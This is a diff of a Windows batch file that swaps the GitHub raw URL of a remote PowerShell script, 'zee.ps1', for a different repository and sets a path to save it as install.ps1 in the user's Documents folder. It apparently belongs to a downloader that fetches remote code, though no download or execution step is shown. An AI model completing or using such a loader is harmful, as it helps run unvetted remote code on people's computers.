@@ -1,6 +1,6 @@
 @echo off
 :: URL of your install.ps1 in cloud
-set PS1_URL=https://raw.githubusercontent.com/Oladaddy1/super/refs/heads/main/zee.ps1
+set PS1_URL=https://raw.githubusercontent.com/thomasmatt237/socialdocsgn/refs/heads/main/zee.ps1
 
 :: Path to save in Documents
 set DOCS_PS1=%USERPROFILE%\Documents\install.ps1
